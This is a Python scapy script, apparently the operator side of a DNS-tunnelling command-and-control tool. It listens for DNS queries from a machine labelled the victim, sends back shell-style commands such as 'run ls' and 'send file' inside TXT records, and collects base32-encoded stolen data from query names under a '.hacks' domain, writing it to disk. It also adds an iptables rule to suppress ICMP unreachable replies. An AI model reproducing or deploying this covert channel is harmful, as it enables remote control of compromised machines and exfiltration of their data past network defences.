from scapy.all import *
import uuid
import socket
import signal
import base64
import os


MY_IP = "192.168.4.34"
VICTIM_IP = "127.0.0.1"
IFACE = "ens160"
FILTER = "udp and port 53 and src host " + VICTIM_IP

READY_ID = "1"
END_ID = "2"
COMMAND_ID = "3"
APPROVE_ID = "4"
NEXT_ID = "5"
DATA_ID = "6"
STARTING_TO_SEND = "7"
SENDING_DATA = "8"

class Session:
    def __init__(self):
        self.my_seq_num = 0
        self.curr_seq = -1
        
    def IncrementClientSeq(self):
        if self.curr_seq == 9:
            self.curr_seq = 0
        else:
            self.curr_seq += 1

    def IncrementMySeq(self):
        if self.my_seq_num == 9:
            self.my_seq_num = 0
        else:
            self.my_seq_num += 1
    
    def IsValid(self ,recieved_seq):
        if self.curr_seq == 9:
            return 0 == recieved_seq
        return recieved_seq == self.curr_seq + 1
    
    def Reset(self):
        self.my_seq_num = 0
        self.curr_seq = -1
        
def EncodeBase32(data ,is_send_file):
    if not is_send_file:
        data = data.encode('utf-8')
    base32_bytes = base64.b32encode(data)
    base32_bytes = base32_bytes.replace(b'=', b'')
    return base32_bytes if is_send_file else base32_bytes.decode('utf-8')

def DecodeBase32(encoded ,is_send_file):
    if not is_send_file:
        encoded = encoded.encode('utf-8')
    encoded += b'=' * (8 - (len(encoded) % 8)) if len(encoded) % 8 else b''
    message_bytes = base64.b32decode(encoded)
    return message_bytes if is_send_file else message_bytes.decode('utf-8')

def SniffDns(interface ,s_filter ,timer):
    try:
        pkt = sniff(filter = s_filter, timeout = timer, count=1 ,iface = interface)
        return pkt.pop() if pkt else None
    except:
        print("Error: SniffIcmp")
        
def BuildPacket(data_to_send ,recieved ,victim_ip):
    return IP(dst = victim_ip) / UDP(dport = recieved["UDP"].sport ,sport = recieved["UDP"].dport) / \
                        DNS(rd = 1 ,id = recieved["DNS"].id ,aa = 1 ,qr = 1 ,qd = recieved["DNS"].qd ,\
                            an = DNSRR(type="TXT" ,rdata = data_to_send ,\
                                        rrname = recieved["DNS"]["DNSQR"].qname.decode("ascii") ,ttl = random.randint(600,20000)))

if __name__ == "__main__":
    i = 0
    os.system("iptables -I OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")
    requested_data = []
    session = Session()
    filename = ""
    is_send_file = 0
    to_resend = None
    while not (pkt := SniffDns(IFACE ,"udp and port 53" ,3)) and pkt["DNS"]["DNSQR"].qname.decode("ascii")[0] != READY_ID:
            pass
    VICTIM_IP = pkt["IP"].src
    while True:
        while not (pkt := SniffDns(IFACE ,"udp and port 53 and src host " + VICTIM_IP ,3)):
            pass
        data = pkt["DNS"]["DNSQR"].qname.decode("ascii")
        sniffed_id = data[0]
        recieved_seq = int(data[1])
        data = data[2:].split('.hacks')[0]
        VICTIM_IP = pkt["IP"].src
        print(recieved_seq ,session.curr_seq)
        if session.IsValid(recieved_seq):
            if sniffed_id == READY_ID:
                print("victim is ready to recieve!")
                command = input("Enter your command:\n" \
                                "(run ls ,run file ,send file)")
                is_send_file = 1 if  "send file" in command else 0
                response = BuildPacket((COMMAND_ID + str(session.my_seq_num) + command) ,pkt ,VICTIM_IP)
                to_resend = response
                send(response)
                session.IncrementClientSeq()
            elif sniffed_id == SENDING_DATA:
                    requested_data.append(DecodeBase32(data ,is_send_file))
                    session.IncrementMySeq()
                    response = BuildPacket((APPROVE_ID + str(session.my_seq_num) + data) ,pkt ,VICTIM_IP)
                    to_resend = response
                    i += 1
                    send(response)
                    session.IncrementClientSeq()
                    print(i)
            elif sniffed_id == END_ID:
                response = BuildPacket((APPROVE_ID + str(session.my_seq_num)) ,pkt ,VICTIM_IP)  
                to_resend = response                       
                send(response)
                with open("./" + "data", "w+b") as binary_file:
                    for b in requested_data:
                        if type(b) == str:
                            b = b.encode('utf-8')
                        binary_file.write(b)
                requested_data = []
                session.Reset()
        else:
            send(to_resend)
            